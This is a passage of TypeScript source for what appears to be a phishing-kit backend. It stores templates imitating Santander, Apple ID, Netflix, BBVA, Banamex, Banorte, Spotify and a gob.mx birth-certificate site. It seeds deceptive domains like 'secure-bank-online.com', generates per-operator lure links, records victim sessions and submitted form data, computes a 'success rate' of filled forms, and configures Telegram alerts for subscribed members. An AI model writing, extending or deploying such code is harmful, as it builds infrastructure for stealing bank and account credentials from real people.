    try {
      return await db.select().from(schema.availableDomains);
    } catch (error) {
      console.error("Error getting domains:", error);
      return [];
    }
  }

  async getAvailableDomain(id: string): Promise<AvailableDomain | undefined> {
    const domains = await this.getAllAvailableDomains();
    return domains.find(d => d.id === id);
  }

  async createAvailableDomain(domain: InsertAvailableDomain): Promise<AvailableDomain> {
    // Insert into database and return the created domain
    const [newDomain] = await db.insert(schema.availableDomains)
      .values({
        ...domain,
        isActive: domain.isActive ?? true,
      })
      .returning();
    
    return newDomain;
  }

  async updateAvailableDomain(id: string, domain: Partial<InsertAvailableDomain>): Promise<AvailableDomain | undefined> {
    try {
      const [updated] = await db.update(schema.availableDomains)
        .set(domain)
        .where(eq(schema.availableDomains.id, id))
        .returning();
      
      return updated || undefined;
    } catch (error) {
      console.error("Error updating domain:", error);
      return undefined;
    }
  }

  async deleteAvailableDomain(id: string): Promise<boolean> {
    try {
      const result = await db.delete(schema.availableDomains)
        .where(eq(schema.availableDomains.id, id));
      
      return (result.rowCount ?? 0) > 0;
    } catch (error) {
      console.error("Error deleting domain:", error);
      return false;
    }
  }

  // Generated Links - Use existing template approach for now
  async createGeneratedLink(link: InsertGeneratedLink): Promise<GeneratedLink> {
    const template = await this.getTemplate(link.templateId!);
    if (!template) {
      throw new Error("Template not found");
    }
    
    const url = `${link.domain}/${link.userId}/${template.numericId}`;
    
    const [result] = await db.insert(schema.generatedLinks)
      .values({
        ...link,
        url,
        isActive: link.isActive ?? true
      })
      .returning();
    
    return result;
  }

  async getGeneratedLink(id: string): Promise<GeneratedLink | undefined> {
    const [link] = await db.select().from(schema.generatedLinks).where(eq(schema.generatedLinks.id, id));
    return link || undefined;
  }

  async getGeneratedLinkByUrl(url: string): Promise<GeneratedLink | undefined> {
    const [link] = await db.select().from(schema.generatedLinks).where(eq(schema.generatedLinks.url, url));
    return link || undefined;
  }

  async getGeneratedLinkByUserAndTemplate(userId: string, templateId: string): Promise<GeneratedLink | undefined> {
    const [link] = await db.select().from(schema.generatedLinks)
      .where(and(eq(schema.generatedLinks.userId, userId), eq(schema.generatedLinks.templateId, templateId)));
    return link || undefined;
  }

  async getAllGeneratedLinks(): Promise<LinkWithStats[]> {
    const links = await db.select().from(schema.generatedLinks).orderBy(desc(schema.generatedLinks.createdAt));
    const result: LinkWithStats[] = [];
    
    for (const link of links) {
      const template = await this.getTemplate(link.templateId!);
      if (template) {
        result.push({
          ...link,
          template,
          sessionCount: 0,
          submissionCount: 0
        });
      }
    }
    
    return result;
  }

  async getGeneratedLinksByUserId(userId: string): Promise<LinkWithStats[]> {
    const links = await db.select().from(schema.generatedLinks)
      .where(eq(schema.generatedLinks.userId, userId))
      .orderBy(desc(schema.generatedLinks.createdAt));
    const result: LinkWithStats[] = [];
    
    for (const link of links) {
      const template = await this.getTemplate(link.templateId!);
      if (template) {
        result.push({
          ...link,
          template,
          sessionCount: 0,
          submissionCount: 0
        });
      }
    }
    
    return result;
  }

  async updateGeneratedLink(id: string, link: Partial<InsertGeneratedLink>): Promise<GeneratedLink | undefined> {
    const [result] = await db.update(schema.generatedLinks)
      .set(link)
      .where(eq(schema.generatedLinks.id, id))
      .returning();
    
    return result || undefined;
  }

  async deleteGeneratedLink(id: string): Promise<boolean> {
    const result = await db.delete(schema.generatedLinks).where(eq(schema.generatedLinks.id, id));
    return (result.rowCount || 0) > 0;
  }

  // Simple implementations for remaining methods
  async createSession(session: InsertSession): Promise<Session> {
    const [result] = await db.insert(schema.sessions)
      .values({
        ...session,
        status: session.status || "active",
        currentScreen: session.currentScreen || "login",
        linkId: session.linkId || null,
        ipAddress: session.ipAddress || null,
        userAgent: session.userAgent || null
      })
      .returning();
    
    return result;
  }

  async getSession(id: string): Promise<Session | undefined> {
    const [session] = await db.select().from(schema.sessions).where(eq(schema.sessions.id, id));
    return session || undefined;
  }

  async getAllSessions(): Promise<SessionWithData[]> {
    const sessions = await db.select().from(schema.sessions).orderBy(desc(schema.sessions.startedAt));
    const result: SessionWithData[] = [];
    
    for (const session of sessions) {
      const submissions = await this.getSubmissionsBySessionId(session.id);
      const link = await this.getGeneratedLink(session.linkId!);
      const template = link ? await this.getTemplate(link.templateId!) : undefined;
      
      if (link && template) {
        result.push({
          ...session,
          submissions,
          link: { ...link, template }
        });
      }
    }
    
    return result;
  }

  async getActiveSessions(): Promise<SessionWithData[]> {
    const allSessions = await this.getAllSessions();
    return allSessions.filter(session => session.status === "active");
  }

  async updateSession(id: string, session: Partial<InsertSession>): Promise<Session | undefined> {
    const [result] = await db.update(schema.sessions)
      .set({ ...session, lastActivity: new Date() })
      .where(eq(schema.sessions.id, id))
      .returning();
    
    return result || undefined;
  }

  async updateSessionStatus(id: string, status: string): Promise<Session | undefined> {
    const [result] = await db.update(schema.sessions)
      .set({ status, lastActivity: new Date() })
      .where(eq(schema.sessions.id, id))
      .returning();
    
    return result || undefined;
  }

  async updateSessionLastActivity(id: string): Promise<Session | undefined> {
    const [result] = await db.update(schema.sessions)
      .set({ lastActivity: new Date() })
      .where(eq(schema.sessions.id, id))
      .returning();
    
    return result || undefined;
  }

  async getSessionsByLinkId(linkId: string): Promise<SessionWithData[]> {
    const allSessions = await this.getAllSessions();
    return allSessions.filter(session => session.linkId === linkId);
  }

  async clearAllSessions(): Promise<boolean> {
    try {
      await db.delete(schema.sessions);
      await db.delete(schema.submissions);
      return true;
    } catch (error) {
      console.error("Error clearing all sessions:", error);
      return false;
    }
  }

  async clearSessionsByUserId(userId: string): Promise<boolean> {
    try {
      // Get sessions for the specific user through their links
      const userLinks = await db.select().from(schema.generatedLinks)
        .where(eq(schema.generatedLinks.userId, userId));
      
      const linkIds = userLinks.map(link => link.id);
      
      if (linkIds.length === 0) {
        return true; // No sessions to clear
      }
      
      // Get session IDs to clear
      const sessionsToDelete = await db.select({ id: schema.sessions.id })
        .from(schema.sessions)
        .where(inArray(schema.sessions.linkId, linkIds));
      
      const sessionIds = sessionsToDelete.map(session => session.id);
      
      // Clear submissions first (foreign key constraint)
      if (sessionIds.length > 0) {
        await db.delete(schema.submissions)
          .where(inArray(schema.submissions.sessionId, sessionIds));
        
        // Then clear sessions
        await db.delete(schema.sessions)
          .where(inArray(schema.sessions.linkId, linkIds));
      }
      
      return true;
    } catch (error) {
      console.error("Error clearing sessions by user ID:", error);
      return false;
    }
  }

  async createSubmission(submission: InsertSubmission): Promise<Submission> {
    const [result] = await db.insert(schema.submissions)
      .values({
        ...submission,
        sessionId: submission.sessionId || null
      })
      .returning();
    
    return result;
  }

  async getSubmissionsBySessionId(sessionId: string): Promise<Submission[]> {
    const submissions = await db.select().from(schema.submissions)
      .where(eq(schema.submissions.sessionId, sessionId))
      .orderBy(desc(schema.submissions.submittedAt));
    
    return submissions;
  }

  async clearSubmissionsBySessionIds(sessionIds: string[]): Promise<boolean> {
    try {
      if (sessionIds.length === 0) return true;
      
      await db.delete(schema.submissions)
        .where(inArray(schema.submissions.sessionId, sessionIds));
      
      return true;
    } catch (error) {
      console.error("Error clearing submissions:", error);
      return false;
    }
  }

  async createActivity(activity: InsertActivity): Promise<Activity> {
    const [result] = await db.insert(schema.activities)
      .values({
        ...activity,
        templateId: activity.templateId || null,
        linkId: activity.linkId || null,
        sessionId: activity.sessionId || null,
        metadata: activity.metadata || null
      })
      .returning();
    
    return result;
  }

  async getRecentActivities(limit: number = 10): Promise<Activity[]> {
    const activities = await db.select().from(schema.activities)
      .orderBy(desc(schema.activities.createdAt))
      .limit(limit);
    
    return activities;
  }

  async getDashboardStats(): Promise<DashboardStats> {
    const [sessionStats] = await db.select({ 
      total: count(),
      active: count(eq(schema.sessions.status, "active")),
      completed: count(eq(schema.sessions.status, "form_filled"))
    }).from(schema.sessions);
    
    const [linkCount] = await db.select({ count: count() }).from(schema.generatedLinks);
    const [submissionCount] = await db.select({ count: count() }).from(schema.submissions);
    
    const successRate = sessionStats.total > 0 ? (sessionStats.completed / sessionStats.total) * 100 : 0;
    
    return {
      activeSessions: sessionStats.active,
      totalLinks: linkCount.count,
      totalSubmissions: submissionCount.count,
      successRate: Math.round(successRate * 10) / 10
    };
  }

  async getAdminDashboardStats(): Promise<AdminDashboardStats> {
    const basicStats = await this.getDashboardStats();
    const [userCount] = await db.select({ count: count() }).from(schema.users);
    const activeMembers = (await this.getActiveMembers()).length;
    const expiredMembers = (await this.getExpiredMembers()).length;
    
    return {
      ...basicStats,
      totalUsers: userCount.count,
      activeMembers,
      expiredMembers
    };
  }

  async getAdminConfig(key: string): Promise<AdminConfig | undefined> {
    const [config] = await db.select().from(schema.adminConfig).where(eq(schema.adminConfig.key, key));
    return config || undefined;
  }

  async setAdminConfig(config: InsertAdminConfig): Promise<AdminConfig> {
    const existing = await this.getAdminConfig(config.key);
    if (existing) {
      const [updated] = await db.update(schema.adminConfig)
        .set(config)
        .where(eq(schema.adminConfig.key, config.key))
        .returning();
      return updated;
    } else {
      const [newConfig] = await db.insert(schema.adminConfig)
        .values(config)
        .returning();
      return newConfig;
    }
  }

  async getPermanentUserId(): Promise<string> {
    let config = await this.getAdminConfig('permanent_user_id');
    if (!config) {
      const userId = this.generatePermanentUserId();
      config = await this.setAdminConfig({
        key: 'permanent_user_id',
        value: userId
      });
      return userId;
    }
    
    return config.value;
  }

  private generatePermanentUserId(): string {
    const chars = '0123456789abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private initializeDefaultTemplates(): Template[] {
    return [
      {
        id: "template-santander-001",
        numericId: "1",
        name: "santander",
        displayName: "Santander Login",
        description: "Banking template",
        brandColor: "#EC0000",
        brandLetter: "S",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-apple-002",
        numericId: "2",
        name: "apple",
        displayName: "Apple ID Login", 
        description: "Tech template",
        brandColor: "#1D1D1F",
        brandLetter: "A",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-liverpool-003",
        numericId: "3", 
        name: "liverpool",
        displayName: "Liverpool Store",
        description: "E-commerce template",
        brandColor: "#E91E63",
        brandLetter: "L",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-netflix-004",
        numericId: "4",
        name: "netflix",
        displayName: "Netflix Streaming",
        description: "Streaming platform template",
        brandColor: "#E50914",
        brandLetter: "N",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-sixflags-005",
        numericId: "5",
        name: "sixflags",
        displayName: "Six Flags México",
        description: "Theme park tickets template",
        brandColor: "#FF6B00",
        brandLetter: "S",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-latam-006",
        numericId: "6",
        name: "latam",
        displayName: "LATAM Vuelos",
        description: "Flight booking template with dynamic bank selection",
        brandColor: "#663399",
        brandLetter: "L",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-actas-007",
        numericId: "7",
        name: "actas",
        displayName: "Acta de Nacimiento",
        description: "Sistema oficial para obtener acta de nacimiento en línea - gob.mx",
        brandColor: "#9D2449",
        brandLetter: "A",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-banamex-008",
        numericId: "8",
        name: "banamex",
        displayName: "Banamex Online",
        description: "Plataforma bancaria en línea de Citibanamex",
        brandColor: "#1e7bb8",
        brandLetter: "B",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-bbva-009",
        numericId: "9",
        name: "bbva",
        displayName: "BBVA México",
        description: "Banca en línea BBVA México",
        brandColor: "#072146",
        brandLetter: "B",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-bbva-premios-010",
        numericId: "10",
        name: "bbva-premios",
        displayName: "BBVA Premios",
        description: "Sistema de premios y ruleta BBVA México",
        brandColor: "#072146",
        brandLetter: "B",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-banorte-premios-011",
        numericId: "11",
        name: "banorte-premios",
        displayName: "Banorte Premios",
        description: "Sistema de premios y ruleta Banorte México",
        brandColor: "#E31E24",
        brandLetter: "B",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-santander-premios-012",
        numericId: "12",
        name: "santander-premios",
        displayName: "Santander Premios",
        description: "Sistema de premios y ruleta Santander México",
        brandColor: "#EC0000",
        brandLetter: "S",
        isActive: true,
        createdAt: new Date()
      },
      {
        id: "template-spotify-013",
        numericId: "13",
        name: "spotify",
        displayName: "Spotify Premium",
        description: "Plataforma de streaming de música - Promoción 3 meses gratis con tarjeta BBVA Digital",
        brandColor: "#1DB954",
        brandLetter: "S",
        isActive: true,
        createdAt: new Date()
      }
    ];
  }

  private initializeDefaultDomains(): AvailableDomain[] {
    return [
      { id: randomUUID(), domain: "secure-bank-online.com", isActive: true, createdAt: new Date() },
      { id: randomUUID(), domain: "my-account-verify.net", isActive: true, createdAt: new Date() },
      { id: randomUUID(), domain: "payment-secure.org", isActive: true, createdAt: new Date() },
      { id: randomUUID(), domain: "account-update.info", isActive: true, createdAt: new Date() },
      { id: randomUUID(), domain: "login-verification.co", isActive: true, createdAt: new Date() }
    ];
  }

  // Telegram Configuration Methods
  async updateUserTelegramConfig(userId: string, telegramChatId: string | null, telegramNotifications: boolean): Promise<User | undefined> {
    try {
      const [updatedUser] = await db
        .update(schema.users)
        .set({ 
          telegramChatId,
          telegramNotifications,
          updatedAt: new Date()
        })
        .where(eq(schema.users.id, userId))
        .returning();
      
      return updatedUser || undefined;
    } catch (error) {
      console.error("Error updating user Telegram config:", error);
      return undefined;
    }
  }

  async getUsersWithTelegramNotifications(): Promise<User[]> {
    try {
      return await db
        .select()
        .from(schema.users)
        .where(and(
          eq(schema.users.telegramNotifications, true),
          eq(schema.users.isActive, true)
        ));
    } catch (error) {
      console.error("Error getting users with Telegram notifications:", error);
      return [];
    }
  }
}

export const storage = new DatabaseStorage();
